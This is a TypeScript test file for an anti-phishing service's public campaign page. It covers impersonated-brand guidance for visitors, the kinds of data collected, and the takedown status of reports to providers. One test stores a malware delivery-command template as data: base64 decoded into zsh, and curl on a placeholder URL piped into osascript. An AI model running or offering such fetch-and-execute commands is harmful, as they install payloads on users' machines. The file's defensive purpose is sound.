import { describe, expect, test } from "bun:test";

import { useTemporaryDatabase } from "../db/test_helpers";
import { SubmissionsEntity } from "../db/entities/submissions";
import { getReportsForSubmission } from "../submissions/abuse_details";
import { seedTrylevoReports } from "../submissions/trylevo_reports.fixtures";
import type { WebsiteSiteAssessment } from "../website/types";
import type { ExtractedIndicator } from "./indicators";
import { getPublicCampaign, siteTakedown, type PublicSiteReport } from "./public_view";
import type { CampaignSite } from "./members";
import { CampaignRepository } from "./repository";
import { confirmedCase } from "./test_sites";

useTemporaryDatabase();

const GOOGLE = { name: "Google", officialUrl: "https://www.google.com/" };
/** The case whose real reports stand in for a campaign site's. */
const TRYLEVO = 384401854580134038n;
const bot: ExtractedIndicator = { kind: "operator_server", value: "telegram-bot:7001", links: true, evidence: { roles: ["receives_data"], backendKind: "telegram_bot", matchedFields: ["email"] } };

const members = new Map<bigint, CampaignSite>();
const memberOf = (id: bigint) => members.get(id)!;

/** A confirmed site whose analysis found the page impersonating `brand`, with the fields it labels. */
async function site(id: bigint, host: string, assessment: Partial<WebsiteSiteAssessment> = {}, indicators: ExtractedIndicator[] = [bot]) {
	const [member] = await confirmedCase(id, { url: `https://${host}/`, routes: [{ hops: [], siteAssessments: [{ hopIndex: 0, finding: "phishing", phishingBasis: "credential_theft", ...assessment }] }] });
	members.set(id, member!);
	await CampaignRepository.recordIndicators(member!, indicators);
	await CampaignRepository.saveSiteFacts(member!, { language: null, thumbnailArtifactId: null, blankCapture: false });
	return (await CampaignRepository.campaignForMember(member!))!;
}

const field = (placeholder: string) => ({ ref: placeholder, control: "input[type=text]", placeholder });

describe("what the public page tells a campaign's visitors", () => {
	test("without guidance: the brand with its domain and no links, and what the pages ask for in page order", async () => {
		const campaign = await site(1n, "samtjo-test.com", { impersonatedBrand: GOOGLE, collectionFields: [field("Mật khẩu"), field("Email or phone")] });
		await site(2n, "other-test.com", { impersonatedBrand: GOOGLE, collectionFields: [field("Enter code")] });
		await CampaignRepository.saveSiteFacts(memberOf(1n), { language: null, thumbnailArtifactId: 7n, blankCapture: true });
		const view = (await getPublicCampaign(campaign))!;
		expect(view.visitor).toEqual({
			brand: { name: "Google", officialUrl: "https://www.google.com/", domain: "google.com", links: {} },
			kinds: ["email", "password", "code", "phone"],
		});
		expect(view.sites.map((entry) => [entry.host, entry.blankCapture, entry.thumbnailUrl])).toEqual([["samtjo-test.com", true, "/api/artifacts/7"], ["other-test.com", false, undefined]]);
	});

	test("with guidance for the brand: its sign-in host, its links and the kinds it adds; guidance for another brand is not shown", async () => {
		const campaign = await site(1n, "a-test.com", { impersonatedBrand: GOOGLE, collectionFields: [field("Password")] });
		const links = { recover: "https://accounts.google.com/signin/recovery", security: "https://myaccount.google.com/security" };
		await CampaignRepository.saveVisitorGuidance(campaign, { brand: { ...GOOGLE, domain: "google.com" }, signInHost: "accounts.google.com", kinds: ["phone"], links });
		expect((await getPublicCampaign(campaign))!.visitor).toEqual({
			brand: { ...GOOGLE, domain: "google.com", signInHost: "accounts.google.com", links },
			// The bot received an email address; the page labels a password; the guidance adds the phone.
			kinds: ["email", "password", "phone"],
		});

		await CampaignRepository.saveVisitorGuidance(campaign, { brand: { name: "Microsoft", officialUrl: "https://www.microsoft.com/", domain: "microsoft.com" }, signInHost: "login.live.com", kinds: ["card"], links: { recover: "https://account.live.com/password/reset" } });
		expect((await getPublicCampaign(campaign))!.visitor).toEqual({ brand: { ...GOOGLE, domain: "google.com", links: {} }, kinds: ["email", "password"] });
	});

	test("without a brand: no brand, and a payment page asks for a payment", async () => {
		const campaign = await site(1n, "pay-test.com", { phishingBasis: "payment_fraud" }, []);
		expect((await getPublicCampaign(campaign))!.visitor).toEqual({ kinds: ["payment"] });
	});

	test("a shared delivery command is shown as a defanged template and a reason; one that links nothing is not", async () => {
		const template = `echo "<url>"; echo '<base64>' | base64 -d | zsh\ncurl -sfL <url> | osascript -l JavaScript`;
		const delivery = (value: string, links: boolean): ExtractedIndicator => ({ kind: "delivery_command", value, links, evidence: { template, shown: "echo x", interpreters: ["osascript"] } });
		await site(1n, "one-test.app", {}, [delivery("a".repeat(64), true), delivery("b".repeat(64), false)]);
		const campaign = await site(2n, "two-test.app", {}, [delivery("a".repeat(64), true), delivery("b".repeat(64), false)]);
		const view = (await getPublicCampaign(campaign))!;
		expect(view.technical.deliveries).toEqual([{ template: `echo "<url>" [then] echo '<base64>' [pipe] base64 -d [pipe] zsh\ncurl -sfL <url> [pipe] osascript -l JavaScript`, siteCount: 2 }]);
	});

	test("a site's reports read as the case page reads them, the strongest first, and its takedown follows from them", async () => {
		const campaign = await site(1n, "trylevo-test.app");
		await SubmissionsEntity.create({ id: TRYLEVO, kind: "website", data: { kind: "website", website: { url: "https://trylevo.app/" } }, dedupeKey: "website-trylevo.app", status: "reported" });
		await seedTrylevoReports(TRYLEVO);
		const loadSiteReports = async () => (await getReportsForSubmission(TRYLEVO)).filter((report) => report.subject === "site");
		const [view] = (await getPublicCampaign(campaign, { loadSiteReports }))!.sites;
		// Cloudflare, a CDN, restricted access: the site counts as taken down, not merely blocklisted.
		expect(view!.takedown).toBe("taken_down");
		expect(view!.reports.map((report) => [report.organisation, report.role, report.bucket])).toEqual([
			["Cloudflare", "cdn", "action_taken"],
			["NameSilo", "registrar", "received"],
			["Netcraft", "blocklist", "declined"],
			["Sollutium-NL", "host", "waiting"],
		]);
		expect(view!.reports[0]).toMatchObject({ label: "Access restricted", quoted: true, ticket: "983629f3ca31bae5" });
		// What happens next is said for an open report only; no correspondence reaches the page.
		expect(view!.reports[0]!.next).toBeUndefined();
		expect(view!.reports[3]!.next).toBeDefined();
		expect(JSON.stringify(view!.reports)).not.toContain("subject");
	});
});

describe("how far a site's takedown got", () => {
	const report = (role: PublicSiteReport["role"], bucket: PublicSiteReport["bucket"]) => ({ role, bucket });
	test("a host, registrar, CDN or platform acting takes it down; a blocklist acting only blocklists it", () => {
		for (const role of ["host", "registrar", "cdn", "platform"] as const) expect(siteTakedown([report("blocklist", "action_taken"), report(role, "action_taken")])).toBe("taken_down");
		expect(siteTakedown([report("blocklist", "action_taken"), report("host", "waiting")])).toBe("blocklisted");
	});

	test("a report a provider has, whatever it decided, counts as reported; only reports that never went out are a problem", () => {
		for (const bucket of ["received", "declined", "unconfirmed", "waiting"] as const) expect(siteTakedown([report("host", bucket), report("registrar", "not_sent")])).toBe("reported");
		expect(siteTakedown([report("host", "not_sent"), report("registrar", "not_sent")])).toBe("problem");
		expect(siteTakedown([])).toBe("none");
	});
});
